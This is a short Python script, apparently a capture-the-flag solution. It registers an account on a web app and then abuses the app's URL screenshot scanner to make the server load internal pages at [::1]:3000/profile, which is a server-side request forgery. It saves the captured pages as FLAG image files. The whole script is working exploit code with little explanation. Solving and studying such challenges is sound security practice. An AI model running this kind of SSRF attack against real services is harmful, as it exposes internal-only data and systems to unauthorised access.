import sc, re, time
U = sc.U
u = 'zz'+sc.rnd(6); s,_ = sc.register(u); sc.login(s,u)
def scan(target, tag):
    r = s.post(f'{U}/scan', data={'url': target}, timeout=120, allow_redirects=True)
    shot = re.search(r'/screenshots/([0-9a-f-]+\.png)', r.text)
    if not shot:
        print(f'  {tag}: no screenshot ({r.status_code})', flush=True); return None
    img = s.get(f'{U}/screenshots/{shot.group(1)}', timeout=60)
    fn = f'FLAG_{tag}.png'
    open(fn,'wb').write(img.content)
    print(f'  {tag}: {fn} {len(img.content)} bytes', flush=True)
    return fn
scan('http://[::1]:3000/profile#clearance', 'clearance')
time.sleep(1)
scan('http://[::1]:3000/profile#service-record', 'servicerec')
